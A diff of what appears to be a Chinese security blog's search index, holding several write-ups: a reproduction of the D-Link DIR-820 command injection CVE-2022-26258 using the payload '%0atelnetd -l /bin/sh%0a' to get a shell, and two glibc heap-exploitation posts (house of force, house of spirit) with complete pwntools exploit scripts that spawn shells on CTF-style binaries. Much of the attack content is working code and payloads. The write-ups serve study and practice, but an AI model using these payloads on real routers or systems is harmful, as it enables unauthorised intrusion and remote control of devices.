@@ -1,152 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>DIR-820 CVE-2022-26258</title>
-    <url>/2024/08/16/DIR-820%20CVE-2022-26258/</url>
-    <content><![CDATA[<h2 id="官方漏洞描述"><a href="#官方漏洞描述" class="headerlink" title="官方漏洞描述"></a>官方漏洞描述</h2><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141131392.png" alt="image-20220425141131392"></p>
-<p>根据漏洞描述我们可以发现漏洞是在/lan.asp中存在一个Device Name导致的一个命令执行</p>
-<h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p><img src="/pic/CVE-2022-26258/1.png" alt="img"></p>
-<p><img src="/pic/CVE-2022-26258/2.png" alt="img"></p>
-<p>通过搜索发现 是把lan_device_name的值传入拼接paramStr</p>
-<p>进一步审计发现 copyDataToDataModelFormat是返回paramStr的也就是说 最后是提交给了get_set.ccp</p>
-<p><img src="/pic/CVE-2022-26258/3.png" alt="img"></p>
-<p>我们用grep -r “get_set.cpp”是查不到相关信息的，既然没有“get_set.ccp”文件，那么可能是这个URL会交给后端处理，处理好之后返回给用户结果。</p>
-<p><img src="/pic/CVE-2022-26258/4.png" alt="img"></p>
-<p>我们通过grep -r “get_set”发现这四个二进制文件中有调用于是我们进一步更进 去分析这四个二进制文件</p>
-<p>然后我们再去看一下开机自启文件包括哪些</p>
-<p><img src="/pic/CVE-2022-26258/5.png" alt="img"></p>
-<p>可以看到开机自启了ncc2和bulkListen</p>
-<p>所以可见正确答案是ncc2的位置，因为有get_set字符串和相对应的函数</p>
-<p><img src="/pic/CVE-2022-26258/6.png" alt="img"></p>
-<p>先对ncc2进行一个简单的分析</p>
-<p><img src="/pic/CVE-2022-26258/7.png" alt="img"></p>
-<p>这里先是对fork子进程的一个检测来判断ncc2是否启动，然后对信号量进行一系列的设置然后设置信号处理函数 再通过ncc_load_hw_cfg设置pin码(这里介绍一下 PIN码（Personal Identification Number, 个人识别号码）是一种为了安全目的而设计的数字代码，通常用于验证用户的身份) 在后面就是一些其他服务的配置部分了</p>
-<p>然后进一步分析 敏感函数 由于是命令执行我们去审system函数的代码</p>
-<p><img src="/pic/CVE-2022-26258/8.png" alt="img"></p>
-<p>这些都不存在命令任意执行漏洞，我们发现还有一个_system函数，想要快速的找到漏洞点就需要根据另一个线索点(Device Name)进行寻找。我们在搜索字符串时如果直接指定DeviceName还是比较难找到的，这里可以先简单搜索Device，然后搜索Name，寻找交叉点</p>
-<p><img src="/pic/CVE-2022-26258/9.png" alt="img"></p>
-<p><img src="/pic/CVE-2022-26258/10.png" alt="img"></p>
-<p>然后定位到sub_4F6DFC函数</p>
-<p><img src="/pic/CVE-2022-26258/11.png" alt="img"></p>
-<p>有两条路径一个利用下面的_system另一个是利用上面的_system</p>
-<p>先分析第一条路径：</p>
-<p>关键是看a2是否可控：</p>
-<p><img src="/pic/CVE-2022-26258/12.png" alt="img"></p>
-<p><img src="/pic/CVE-2022-26258/13.png" alt="img"></p>
-<p><img src="/pic/CVE-2022-26258/14.png" alt="img"></p>
-<p>发现不可控 此路不通0……….0</p>
-<p>第二条路径：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Obj = (const char **)getObj(0x60u, (int)v9);</span><br><span class="line">v4 = Obj;</span><br></pre></td></tr></tbody></table></figure>
-
-<p>v4是<code>getObj</code>函数的返回值Obj，需要绕过<code>hasInjectionString</code>的判断才能到达命令注入点，现在需要找到<code>hasInjectionString</code> 函数在哪个文件中，同样使用<code>grep -r</code> 命令：</p>
-<p><img src="/pic/CVE-2022-26258/15.png" alt="img"></p>
-<p><img src="/pic/CVE-2022-26258/16.png" alt="img"></p>
-<p>这里就是一些简单的过滤 没有过滤冒号和换行符，可以使用“\n”来绕过</p>
-<p>这里就可以通过修改参数来进行命令执行了</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo ./run.sh -r DIR820L /home/luyouqi/模拟/Dir-820/DIR820LA1_FW105B03.bin</span><br></pre></td></tr></tbody></table></figure>
-
-<p>用FIRMAE进行环境直接模拟</p>
-<p><img src="/pic/CVE-2022-26258/17.png" alt="img"></p>
-<p>模拟好之后是这样 访问后</p>
-<p><img src="/pic/CVE-2022-26258/18.png" alt="img"></p>
-<p>默认密码是空直接登录就可 必须要登录这是验证后的命令执行漏洞</p>
-<p><img src="/pic/CVE-2022-26258/19.png" alt="img"></p>
-<p><img src="/pic/CVE-2022-26258/20.png" alt="img"></p>
-<p>修改红框参数为 %0atelnetd  -l /bin/sh%0a</p>
-<p>这里要注意直接在原包上进行修改 而不是放入重放后修改再发送，原因是会认定发送了多次导致崩溃 无法执行，发送后在等十秒就可以了</p>
-<p><img src="/pic/CVE-2022-26258/21.png" alt="img"></p>
-<p>再用telnet进行连接 就可以成功拿到shell</p>
-<p><img src="/pic/CVE-2022-26258/22.png" alt="img"></p>
-<h2 id="额外挖掘"><a href="#额外挖掘" class="headerlink" title="额外挖掘"></a>额外挖掘</h2><p>额外漏洞查找，一般漏洞存在就意味着肯定不只一个 我们继续去查询可能涉及到http_post且是需要执行的语句</p>
-<p><img src="/pic/CVE-2022-26258/23.png" alt="img"></p>
-<p>可以看到这个界面也是post指令传入 那我们就跟进tools_vct.asp查看</p>
-<p><img src="/pic/CVE-2022-26258/24.png" alt="img"></p>
-<p>传入的是ping.cpp</p>
-<p>通过前面的过程 查询发现可能还是在ncc2中 继续审代码发现</p>
-<p><img src="/pic/CVE-2022-26258/25.png" alt="img"></p>
-<p>是不是非常熟悉基本和前面那个洞没区别了</p>
-<p><img src="/pic/CVE-2022-26258/26.png" alt="img"></p>
-<p>然后发送 之后连接看看能否拿到shell</p>
-<p><img src="/pic/CVE-2022-26258/27.png" alt="img"></p>
-<p>成功了！！！！ </p>
-<p>刚准备去交cnvd的 结果一查</p>
-<p><img src="/pic/CVE-2022-26258/28.png" alt="img"></p>
-<p>得 白高兴一场 早被打了</p>
-<p>参考文献：<a href="https://cn-sec.com/archives/1262036.html">https://cn-sec.com/archives/1262036.html</a></p>
-]]></content>
-      <categories>
-        <category>iot</category>
-        <category>漏洞复现</category>
-        <category>dir</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现---命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>house_of_force进阶(和tcache污染结合)</title>
-    <url>/2024/08/17/house%20of%20force%20upgrade%20/</url>
-    <content><![CDATA[<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>常规使用的house of force 是通过泄露了堆和libc的地址来修改hook函数导致的shell</p>
-<p>而无法泄露堆地址的情况，按常规的思路就打不了了，这时候就出现了house of force 进阶搭配tcache 头污染，可以避免部分情况去走io链</p>
-<h2 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h2><p>libc 2.23-2.27</p>
-<h2 id="原理描述"><a href="#原理描述" class="headerlink" title="原理描述"></a>原理描述</h2><p>泄露libc地址后，通过改top chunk为-1，然后申请负堆块，把堆块也就是top chunk控到tcache头开始的位置，然后污染tcache头 植入hook函数的地址 在取出来达到任意写的目的</p>
-<h2 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/0.png" alt="img"></p>
-<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/1.png" alt="img"></p>
-<h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/2.png" alt="img"></p>
-<p>这里free的功能实际上是不存在的，这看上去是加密的一个过程</p>
-<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/3.png" alt="img"></p>
-<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/4.png" alt="img"></p>
-<p>输入多少字节就读入多少字节，这里明显存在一个堆溢出</p>
-<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>由于没有free函数 我们可以用house of orange 前期的思路去泄露libc地址，然后通过堆溢出改写top chunk为-1，把堆地址控到tcache头，然后污染，提取出hook函数的地址 并进行修改，改为ogg，由于题目条件限制，这里ogg是打不通的，需要用realloc调栈帧</p>
-<h4 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h4><h5 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h5><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">add(0x18)#0</span><br><span class="line">edit(0,b'a'*0x18+p64(0xd91))</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/5.png" alt="img"></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">add(0x1008) #old topchunk to unsortedbin  1</span><br><span class="line">add(0xd60)#2</span><br><span class="line">show(2)</span><br><span class="line">libc_addr=l64()-0x3ebca0</span><br><span class="line">libc.address=libc_addr</span><br><span class="line">malloc_hook=libc.sym['__malloc_hook']-8</span><br><span class="line">realloc_hook=libc.sym['realloc']+2</span><br><span class="line">log_addr(libc_addr)</span><br><span class="line">libc.address=libc_addr</span><br></pre></td></tr></tbody></table></figure>
-
-<h5 id="house-of-force部分"><a href="#house-of-force部分" class="headerlink" title="house of force部分"></a>house of force部分</h5><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">edit(1,b'\x00'*0x1008+p64(0xffffffffffffffff))</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/6.png" alt="img"></p>
-<p>这里算是关键，我开始就是卡在照着heap显示的堆修改的top chunk，其实应该是修改当时申请的0x1008这个堆</p>
-<h5 id="tcache头污染"><a href="#tcache头污染" class="headerlink" title="tcache头污染"></a>tcache头污染</h5><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">add(-0x22010)#3</span><br><span class="line">add(0x100)#4</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/7.png" alt="img"></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">payload=b'\x07'*0x30+p64(malloc_hook)*0x10+b'\n'</span><br><span class="line">edit(4,payload)</span><br></pre></td></tr></tbody></table></figure>
-
-<p>污染前：</p>
-<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/8.png" alt="img"></p>
-<p>污染后：</p>
-<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/9.png" alt="img"></p>
-<h5 id="修改hook地址"><a href="#修改hook地址" class="headerlink" title="修改hook地址"></a>修改hook地址</h5><p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/10.png" alt="img"></p>
-<p>成功修改，拿到shell</p>
-<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/11.png" alt="img"></p>
-<p>这里展示一下调栈帧打ogg的过程</p>
-<p>要满足的条件：</p>
-<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/12.png" alt="img"></p>
-<p>要满足三个条件：</p>
-<ol>
-<li>地址rsp+0x50要可写</li>
-<li>rsp &amp; 0xf ==0</li>
-<li>rcx == NULL</li>
-</ol>
-<p>修改前：</p>
-<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/13.png" alt="img"></p>
-<p>可以看到rsp不满足条件2，此时是realloc的情况，而为了让它满足我们只需要让rsp上调0x8就可以了 我们把realloc往上调整一个push</p>
-<p>也就是realloc+2</p>
-<p>修改后：</p>
-<p><img src="/pic/house_of_force%E8%BF%9B%E9%98%B6/14.png" alt="img"></p>
-<p>exp如下：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#--------------------setting context---------------------</span><br><span class="line">context.clear(arch='amd64', os='linux', log_level='debug')</span><br><span class="line"></span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">sla = lambda data, content: mx.sendlineafter(data,content)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">sl = lambda data: mx.sendline(data)</span><br><span class="line">rl = lambda data: mx.recvuntil(data)</span><br><span class="line">re = lambda data: mx.recv(data)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">inter = lambda: mx.interactive()</span><br><span class="line">l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))</span><br><span class="line">h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))</span><br><span class="line">s=lambda data: mx.send(data)</span><br><span class="line">log_addr=lambda data: log.success("---&gt;"+hex(data))</span><br><span class="line">p = lambda s: print('\033[1;31;40m%s --&gt; 0x%x \033[0m' % (s, eval(s)))</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(mx)</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------</span><br><span class="line"># libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')</span><br><span class="line">filename = "./pwn"</span><br><span class="line">mx = process(filename)</span><br><span class="line">#mx = remote("node5.anna.nssctf.cn",24071)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#初始化完成---------------------------------------------------------\</span><br><span class="line">def add(size):</span><br><span class="line">	sla("Enter 1 to add, 2 to free, 3 to show, 4 to edit, 0 to exit:",b'1')</span><br><span class="line">	sla(":",str(size))</span><br><span class="line">def edit(idx,payload):</span><br><span class="line">	sla(":",b'4')</span><br><span class="line">	sla(b":",str(idx))</span><br><span class="line">	sla(b"size\n",str(len(payload)))</span><br><span class="line">	s(payload)</span><br><span class="line">def show(idx):</span><br><span class="line">	sla(":",b'3')</span><br><span class="line">	sla(b":",str(idx))</span><br><span class="line">	#sa(b":",payload)</span><br><span class="line">dbg()</span><br><span class="line">add(0x18)#0</span><br><span class="line">edit(0,b'a'*0x18+p64(0xd91))</span><br><span class="line">add(0x1008) #old topchunk to unsortedbin  1</span><br><span class="line"></span><br><span class="line">add(0xd60)#2</span><br><span class="line"></span><br><span class="line">show(2)</span><br><span class="line">libc_addr=l64()-0x3ebca0</span><br><span class="line">libc.address=libc_addr</span><br><span class="line">malloc_hook=libc.sym['__malloc_hook']-8</span><br><span class="line">realloc_hook=libc.sym['realloc']+2</span><br><span class="line">log_addr(libc_addr)</span><br><span class="line">libc.address=libc_addr</span><br><span class="line"></span><br><span class="line">edit(1,b'\x00'*0x1008+p64(0xffffffffffffffff))</span><br><span class="line">add(-0x22010)#3</span><br><span class="line">add(0x100)#4</span><br><span class="line">payload=b'\x07'*0x30+p64(malloc_hook)*0x10+b'\n'</span><br><span class="line">edit(4,payload)</span><br><span class="line">add(0x100)#5</span><br><span class="line">#edit()</span><br><span class="line">ogg=libc_addr+0x4f2c5</span><br><span class="line">#0x4f2be 0x4f2c5 0x4f322 0x10a38c</span><br><span class="line">edit(5,p64(ogg)+p64(realloc_hook))</span><br><span class="line">#dbg()</span><br><span class="line">pause()</span><br><span class="line">sla("Enter 1 to add, 2 to free, 3 to show, 4 to edit, 0 to exit:",b'1')</span><br><span class="line">sla(":",b'0x100')</span><br><span class="line">inter()</span><br></pre></td></tr></tbody></table></figure>
-
-]]></content>
-      <categories>
-        <category>pwn学习</category>
-        <category>堆利用</category>
-      </categories>
-      <tags>
-        <tag>house of</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>TOTOLINK_NR1800X Multi-vulnerability analysis</title>
     <url>/2024/08/17/TOTOLINK_NR1800X%20Multi-vulnerability%20analysis/</url>
     <content><![CDATA[<h2 id="固件提取："><a href="#固件提取：" class="headerlink" title="固件提取："></a>固件提取：</h2><figure class="highlight ruby"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.totolink.net/home</span><span class="regexp">/menu/detail</span><span class="regexp">/menu_listtpl/download</span><span class="regexp">/id/</span><span class="number">225</span>/ids/<span class="number">36</span>.html</span><br></pre></td></tr></tbody></table></figure>
@@ -231,59 +85,6 @@
       </categories>
       <tags>
         <tag>漏洞复现---登录验证绕过</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>house-of-Spirit</title>
-    <url>/2024/08/15/house%20of%20spirit/</url>
-    <content><![CDATA[<h2 id="House-of-Spirit-是-the-Malloc-Maleficarum-中的一种技术。"><a href="#House-of-Spirit-是-the-Malloc-Maleficarum-中的一种技术。" class="headerlink" title="House of Spirit 是 the Malloc Maleficarum 中的一种技术。"></a>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</h2><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
-<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
-<ul>
-<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
-<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
-<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
-<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li>
-<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
-</ul>
-<h3 id="我们通过原理去分析-这些检测的绕过的代码原理"><a href="#我们通过原理去分析-这些检测的绕过的代码原理" class="headerlink" title="我们通过原理去分析 这些检测的绕过的代码原理"></a>我们通过原理去分析 这些检测的绕过的代码原理</h3><h3 id="MALLOC-ALIGN-MASK"><a href="#MALLOC-ALIGN-MASK" class="headerlink" title="MALLOC_ALIGN_MASK"></a>MALLOC_ALIGN_MASK</h3><p>因为fake_chunk可以在任意可写位置构造，这里对齐指的是地址上的对齐而不仅仅是内存对齐，比如32位程序的话fake_chunk的prev_size所在地址就应该位<code>0xXXXX0</code>或<code>0xXXXX4</code>。64位的话地址就应该在<code>0xXXXX0</code>或<code>0xXXXX8</code></p>
-<h3 id="fake-chunk-的-ISMMAP"><a href="#fake-chunk-的-ISMMAP" class="headerlink" title="fake chunk 的 ISMMAP"></a>fake chunk 的 ISMMAP</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#if HAVE_MMAP   </span><br><span class="line">    if (chunk_is_mmapped(p))       /* release mmapped memory. */</span><br><span class="line">    {     /* see if the dynamic brk/mmap threshold needs adjusting */</span><br><span class="line">        if (!mp_.no_dyn_threshold</span><br><span class="line">            &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold         </span><br><span class="line">            &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)       </span><br><span class="line">        {         </span><br><span class="line">            mp_.mmap_threshold = chunksize (p);</span><br><span class="line">            mp_.trim_threshold = 2 * mp_.mmap_threshold;       </span><br><span class="line">        }     </span><br><span class="line">        munmap_chunk(p);     </span><br><span class="line">    return;   </span><br><span class="line">    }</span><br><span class="line"> #endi</span><br></pre></td></tr></tbody></table></figure>
-
-<p>可以看到， MMAP 位需要置 0 ，否则 free 会，调用 munmap_chunk() 函数 unmap 本 chunk ，达不到进入 fastbin 的目的。</p>
-<h2 id="fake-chunk-的-size"><a href="#fake-chunk-的-size" class="headerlink" title="fake chunk 的 size"></a>fake chunk 的 size</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (*fb != NULL</span><br><span class="line">    &amp;&amp; __builtin_expect (fastbin_index(chunksize(*fb)) != idx, 0))               </span><br><span class="line">    {         </span><br><span class="line">        errstr = "invalid fastbin entry (free)";         </span><br><span class="line">        goto errout;       </span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
-
-<p> fake chunk 的 size 大小 需要满足对应的 fastbin 的 index ，同时也得对齐。</p>
-<h2 id="fake-chunk-的-next-chunk"><a href="#fake-chunk-的-next-chunk" class="headerlink" title="fake chunk 的 next chunk"></a>fake chunk 的 next chunk</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">    || __builtin_expect (chunksize (chunk_at_offset (p, size))&gt;= av-&gt;system_mem, 0))       </span><br><span class="line">    { </span><br><span class="line">#ifdef ATOMIC_FASTBINS         </span><br><span class="line">    /* We might not have a lock at this point and concurrent modifications</span><br><span class="line">       of system_mem might have let to a false positive.  Redo the test</span><br><span class="line">       after getting the lock.  */</span><br><span class="line">    if (have_lock</span><br><span class="line">        || ({ assert (locked == 0);</span><br><span class="line">              mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">              locked = 1;</span><br><span class="line">              chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ                     </span><br><span class="line">              || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;               </span><br><span class="line">            })) </span><br><span class="line">#endif           </span><br><span class="line">            {             </span><br><span class="line">                errstr = "free(): invalid next size (fast)";             </span><br><span class="line">                goto errout;           </span><br><span class="line">            } </span><br><span class="line">#ifdef ATOMIC_FASTBINS         </span><br><span class="line">            if (! have_lock)           </span><br><span class="line">                {             </span><br><span class="line">                    (void)mutex_unlock(&amp;av-&gt;mutex);             </span><br><span class="line">                    locked = 0;           </span><br><span class="line">                } </span><br><span class="line">#endif       </span><br><span class="line">    } </span><br></pre></td></tr></tbody></table></figure>
-
-<h3 id="fake-chunk-对应的-fastbin-链表头部"><a href="#fake-chunk-对应的-fastbin-链表头部" class="headerlink" title="fake chunk 对应的 fastbin 链表头部"></a>fake chunk 对应的 fastbin 链表头部</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (__builtin_expect (*fb == p, 0))       </span><br><span class="line">    {         </span><br><span class="line">        errstr = "double free or corruption (fasttop)";         </span><br><span class="line">        goto errout;       </span><br><span class="line">    } </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-
-
-
-<h2 id="例题-I-ctf-pwn200"><a href="#例题-I-ctf-pwn200" class="headerlink" title="例题 I ctf pwn200"></a>例题 I ctf pwn200</h2><h3 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路:"></a>核心思路:</h3><p>通过house of spirit 进行fake chunk的伪造在栈上布置fake chunk 然后劫持程序流 走ret2shellcode</p>
-<h3 id="静态分析："><a href="#静态分析：" class="headerlink" title="静态分析："></a>静态分析：</h3><p><img src="/pic/house_of_spirit/0.png" alt="img"></p>
-<p>通过静态分析我们可以了解基本思路，接下来我们通过动态调试去看看</p>
-<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">rl("who are u?\n")</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')</span><br><span class="line">payload  = b''</span><br><span class="line">payload += shellcode.ljust(48,b'\x00')</span><br><span class="line">mx.send(payload)</span><br><span class="line">stack_addr=l64()</span><br><span class="line">log_addr(stack_addr)</span><br><span class="line">rl("give me your id ~~?\n")</span><br><span class="line">mx.sendline('1') 错误 改为52</span><br></pre></td></tr></tbody></table></figure>
-
-<p><strong>特别注意</strong> 这里的id不能输入小2*minsize的值 因为是作为下一个chunk的size 位 要满足check的条件 不然就会报错</p>
-<p>看一下我们输入的值和泄露的地址的布局</p>
-<p><img src="/pic/house_of_spirit/1.png" alt="img"></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">rl("give me money~")</span><br><span class="line">fake_addr = stack_addr - 0x90 # offset 0x40 to shellcode, 0x400a29 return address</span><br><span class="line">log_addr(fake_addr)</span><br><span class="line">data = p64(0) * 4 + p64(0) + p64(0x41)      # no strcpy</span><br><span class="line">data = data.ljust(56, b'\x00') + p64(fake_addr)</span><br><span class="line">mx.send(data)</span><br></pre></td></tr></tbody></table></figure>
-
-<p>进行覆盖修改ptr和fake chunk的伪造</p>
-<p><img src="/pic/house_of_spirit/2.png" alt="img"></p>
-<p>然后我们把这个fake_chunk free 再add回来劫持控制流</p>
-<p><img src="/pic/house_of_spirit/3.png" alt="img"></p>
-<p><img src="/pic/house_of_spirit/4.png" alt="img"></p>
-<p>成功shell</p>
-<p><img src="/pic/house_of_spirit/5.png" alt="img"></p>
-<p>exp如下:</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#--------------------setting context---------------------</span><br><span class="line">context.clear(arch='amd64', os='linux', log_level='debug')</span><br><span class="line"></span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">sla = lambda data, content: mx.sendlineafter(data,content)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">sl = lambda data: mx.sendline(data)</span><br><span class="line">rl = lambda data: mx.recvuntil(data)</span><br><span class="line">re = lambda data: mx.recv(data)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">inter = lambda: mx.interactive()</span><br><span class="line">l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))</span><br><span class="line">h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))</span><br><span class="line">s=lambda data: mx.send(data)</span><br><span class="line">log_addr=lambda data: log.success("---&gt;"+hex(data))</span><br><span class="line">p = lambda s: print('\033[1;31;40m%s --&gt; 0x%x \033[0m' % (s, eval(s)))</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(mx)</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------</span><br><span class="line"># libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')</span><br><span class="line">filename = "./pwn200"</span><br><span class="line">mx = process(filename)</span><br><span class="line">#mx = remote("node5.anna.nssctf.cn",24071)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">#初始化完成---------------------------------------------------------\</span><br><span class="line">dbg()</span><br><span class="line">rl("who are u?\n")</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')</span><br><span class="line">payload  = b''</span><br><span class="line">payload += shellcode.ljust(48,b'\x00')</span><br><span class="line">mx.send(payload)</span><br><span class="line">stack_addr=l64()</span><br><span class="line">log_addr(stack_addr)</span><br><span class="line">rl("give me your id ~~?\n")</span><br><span class="line">mx.sendline('52')</span><br><span class="line">pause()</span><br><span class="line">rl("give me money~")</span><br><span class="line">fake_addr = stack_addr - 0x90 # offset 0x40 to shellcode, 0x400a29 return address</span><br><span class="line">log_addr(fake_addr)</span><br><span class="line">data = p64(0) * 4 + p64(0) + p64(0x41)      # no strcpy</span><br><span class="line">data = data.ljust(56, b'\x00') + p64(fake_addr)</span><br><span class="line">mx.send(data)</span><br><span class="line">pause()</span><br><span class="line">rl("your choice : ")</span><br><span class="line">sl(b"2")</span><br><span class="line">rl("your choice : ")</span><br><span class="line">sl(b"1")</span><br><span class="line">rl("how long?\n")</span><br><span class="line">sl(str(0x30))</span><br><span class="line">rl("give me more money : \n")</span><br><span class="line">payload=p64(0)*3+p64(stack_addr-0x50)</span><br><span class="line">mx.send(payload)</span><br><span class="line"># payload</span><br><span class="line">inter()</span><br></pre></td></tr></tbody></table></figure>
-]]></content>
-      <categories>
-        <category>pwn学习</category>
-        <category>堆利用</category>
-      </categories>
-      <tags>
-        <tag>house_of</tag>
       </tags>
   </entry>
   <entry>
@@ -410,6 +211,142 @@
 
 <p><img src="/pic/house_of_cat/13.png" alt="img"></p>
 <p>成功劫持，至此house of cat的过程结束</p>
+]]></content>
+      <categories>
+        <category>pwn学习</category>
+        <category>堆利用</category>
+      </categories>
+      <tags>
+        <tag>house_of</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DIR-820 CVE-2022-26258</title>
+    <url>/2024/08/16/DIR-820%20CVE-2022-26258/</url>
+    <content><![CDATA[<h2 id="官方漏洞描述"><a href="#官方漏洞描述" class="headerlink" title="官方漏洞描述"></a>官方漏洞描述</h2><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141131392.png" alt="image-20220425141131392"></p>
+<p>根据漏洞描述我们可以发现漏洞是在/lan.asp中存在一个Device Name导致的一个命令执行</p>
+<h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p><img src="/pic/CVE-2022-26258/1.png" alt="img"></p>
+<p><img src="/pic/CVE-2022-26258/2.png" alt="img"></p>
+<p>通过搜索发现 是把lan_device_name的值传入拼接paramStr</p>
